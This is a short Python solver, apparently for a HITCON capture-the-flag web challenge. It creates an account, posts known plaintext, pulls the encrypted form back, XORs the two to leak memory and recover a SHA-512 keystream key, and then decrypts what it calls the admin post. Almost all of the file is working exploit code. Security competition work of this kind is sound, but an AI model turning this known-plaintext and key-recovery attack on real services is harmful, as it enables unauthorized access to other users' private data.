from requests import Session
from base64 import *
from hashlib import *
from pwn import xor
import struct

s = Session()

url = "http://gleamering.chal.hitconctf.com:30482"
r = s.post(url + "/signup", data="user=fuck&pass=fuck&id=1", headers={"Content-Type" : "application/x-www-form-urlencoded", "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"})
# print(r.text)

r = s.post(url + "/posts", data="content=" + "a" * 0x2000, headers={"Content-Type" : "application/x-www-form-urlencoded", "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"})
item_id = int(r.text.split('id="item-')[1].split('"')[0])

print(item_id)
r = s.patch(url + f"/posts/{item_id}", headers={"Content-Type" : "application/x-www-form-urlencoded", "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"})
ct = b64decode(r.text.split('value="')[1].split('"')[0])
pt = b'a' * 0x2000

leak = bytes([i ^ j for i, j in zip(pt, ct)])

for i in range(0, len(leak), 8):
    k = struct.unpack("<Q", leak[i:i+8])[0] >> 4
    usermult = 0xDEADBEEF
    msgmult = 0xCAFEBABE

    user_id = 1
    msg_id = item_id
    key = k
    key = user_id * usermult + msg_id * msgmult + key * user_id

    candi = bytes([a ^ b for a, b in zip(sha512((key).to_bytes(16, 'big')).digest(), ct[:0x40])])
    if candi == b'a' * 0x40:
        key = k
        print(key)
        break

usermult = 0xDEADBEEF
msgmult = 0xCAFEBABE

user_id = 1
msg_id = 1
# key = 2099777860903446

k = user_id * usermult + msg_id * msgmult + key * user_id

# The admin post's item_id is key + 2.
ct = b64decode('HElfQcL4rHu+WVvYdsk0ReQ161/ojmQDy4ariN9xsg0O/F6BYvJpdLVrG9ximjdtsh/R1cYCO/Xw4ZKCtA==')
print(xor(sha512((k).to_bytes(16, 'big')).digest(), ct))
